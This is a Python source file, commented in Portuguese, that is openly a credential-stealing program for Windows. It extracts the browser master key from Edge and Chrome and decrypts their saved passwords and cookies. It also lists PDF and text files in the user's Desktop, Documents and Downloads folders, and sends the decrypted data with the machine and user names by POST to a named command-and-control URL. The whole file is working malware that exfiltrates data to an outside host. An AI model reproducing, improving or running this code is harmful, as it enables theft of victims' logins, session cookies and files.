import os
import sys
import json
import sqlite3
import shutil
import base64
import urllib.request
import urllib.parse
import platform
import getpass
from datetime import datetime
from Crypto.Cipher import AES
import win32crypt

# ============================================================
# 🧪 LINHA DE TESTE (ADICIONADA)
# ============================================================
with open(os.path.expanduser("~/stealer_rodou.txt"), "w") as f:
    f.write("STEALER RODOU COM SUCESSO\n")
    f.write(f"Data/Hora: {datetime.now().isoformat()}\n")
    f.write(f"Máquina: {platform.node()}\n")
    f.write(f"Usuário: {getpass.getuser()}\n")
# ============================================================

# CONFIGURAÇÃO DO C2
C2_URL = "https://research-ghost-c2-hydrate-production.up.railway.app/exfil"

# ============================================================
# PATHS DOS NAVEGADORES
# ============================================================
CHROME_PATHS = {
    'local_state': os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Local State'),
    'cookies_db': os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'),
    'login_db': os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
}

EDGE_PATHS = {
    'local_state': os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Local State'),
    'cookies_db': os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies'),
    'login_db': os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data')
}

def get_system_info():
    return {
        'machine_name': platform.node(),
        'username': getpass.getuser(),
        'os': platform.platform(),
        'timestamp': datetime.now().isoformat()
    }

def get_master_key(browser='edge'):
    if browser == 'edge':
        local_state_path = EDGE_PATHS['local_state']
    else:
        local_state_path = CHROME_PATHS['local_state']
    
    if not os.path.exists(local_state_path):
        print(f"[!] {browser} Local State not found")
        return None
    
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    
    encrypted_key = local_state['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key)
    encrypted_key = encrypted_key[5:]
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    
    if len(decrypted_key) == 32:
        print(f"[+] {browser} master key extracted")
        return decrypted_key
    return None

def decrypt_value(encrypted_data, master_key):
    if encrypted_data[:3] == b'v10' or encrypted_data[:3] == b'v11':
        try:
            nonce = encrypted_data[3:15]
            ciphertext = encrypted_data[15:-16]
            tag = encrypted_data[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8', errors='ignore')
        except:
            return None
    try:
        decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
        return decrypted.decode('utf-8', errors='ignore')
    except:
        return None

def copy_locked_db(src_path):
    temp_path = os.path.join(os.environ['TEMP'], os.path.basename(src_path))
    try:
        shutil.copy2(src_path, temp_path)
        return temp_path
    except:
        return None

def extract_cookies(browser='edge'):
    """Extrai cookies do navegador"""
    print(f"[*] Extracting cookies from {browser}...")
    
    master_key = get_master_key(browser)
    if not master_key:
        return []
    
    if browser == 'edge':
        cookies_db = EDGE_PATHS['cookies_db']
    else:
        cookies_db = CHROME_PATHS['cookies_db']
    
    if not os.path.exists(cookies_db):
        return []
    
    temp_db = copy_locked_db(cookies_db)
    if not temp_db:
        return []
    
    cookies = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value, path FROM cookies")
        
        for host, name, encrypted_value, path in cursor.fetchall():
            if encrypted_value:
                decrypted = decrypt_value(encrypted_value, master_key)
                if decrypted:
                    cookies.append({
                        'host': host,
                        'name': name,
                        'value': decrypted,
                        'path': path,
                        'browser': browser
                    })
                    print(f"    [+] {host} | {name}")
        conn.close()
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        os.remove(temp_db)
    
    print(f"[+] {browser}: {len(cookies)} cookies extracted")
    return cookies

def extract_passwords(browser='edge'):
    """Extrai senhas do navegador"""
    print(f"[*] Extracting passwords from {browser}...")
    
    master_key = get_master_key(browser)
    if not master_key:
        return []
    
    if browser == 'edge':
        login_db = EDGE_PATHS['login_db']
    else:
        login_db = CHROME_PATHS['login_db']
    
    if not os.path.exists(login_db):
        return []
    
    temp_db = copy_locked_db(login_db)
    if not temp_db:
        return []
    
    passwords = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for url, username, password_enc in cursor.fetchall():
            if password_enc:
                password = decrypt_value(password_enc, master_key)
                if password:
                    passwords.append({
                        'url': url,
                        'username': username,
                        'password': password,
                        'browser': browser
                    })
                    print(f"    [+] {url}")
        conn.close()
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        os.remove(temp_db)
    
    print(f"[+] {browser}: {len(passwords)} passwords extracted")
    return passwords

def coletar_documentos():
    """Coleta apenas PDF e TXT (sem lixo)"""
    print("[*] Coletando documentos (PDF e TXT)...")
    
    pastas_alvo = [
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Downloads")
    ]
    
    extensoes = [".pdf", ".txt"]
    arquivos_encontrados = []
    
    for pasta in pastas_alvo:
        if not os.path.exists(pasta):
            continue
        for raiz, dirs, arquivos in os.walk(pasta):
            for arquivo in arquivos:
                ext = os.path.splitext(arquivo)[1].lower()
                if ext in extensoes:
                    caminho = os.path.join(raiz, arquivo)
                    try:
                        tamanho = os.path.getsize(caminho)
                        if tamanho < 5 * 1024 * 1024:
                            with open(caminho, 'rb') as f:
                                conteudo = f.read()
                            arquivos_encontrados.append({
                                'nome': arquivo,
                                'caminho': caminho,
                                'tamanho': tamanho
                            })
                            print(f"    [+] {arquivo} ({tamanho} bytes)")
                    except:
                        pass
    
    print(f"[+] Total documentos: {len(arquivos_encontrados)}")
    return arquivos_encontrados

def send_to_c2(data, data_type):
    system_info = get_system_info()
    payload = {
        'machine_name': system_info['machine_name'],
        'username': system_info['username'],
        'data_type': data_type,
        'data': json.dumps(data, ensure_ascii=False),
        'timestamp': system_info['timestamp']
    }
    
    try:
        data_bytes = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(C2_URL, data=data_bytes, method='POST')
        req.add_header('Content-Type', 'application/json')
        urllib.request.urlopen(req, timeout=30)
        print(f"[+] Sent {len(data)} {data_type} to C2")
        return True
    except Exception as e:
        print(f"[-] Failed to send: {e}")
        return False

def main():
    print("[*] Stealer running...")
    
    all_cookies = []
    all_passwords = []
    
    # Edge
    edge_cookies = extract_cookies('edge')
    edge_passwords = extract_passwords('edge')
    all_cookies.extend(edge_cookies)
    all_passwords.extend(edge_passwords)
    
    # Chrome
    chrome_cookies = extract_cookies('chrome')
    chrome_passwords = extract_passwords('chrome')
    all_cookies.extend(chrome_cookies)
    all_passwords.extend(chrome_passwords)
    
    # Enviar cookies
    if all_cookies:
        send_to_c2(all_cookies, 'cookies')
    
    # Enviar senhas
    if all_passwords:
        send_to_c2(all_passwords, 'passwords')
    
    # Documentos
    documentos = coletar_documentos()
    if documentos:
        send_to_c2(documentos, 'documentos')
    
    print("[*] Stealer finished")

if __name__ == "__main__":
    main()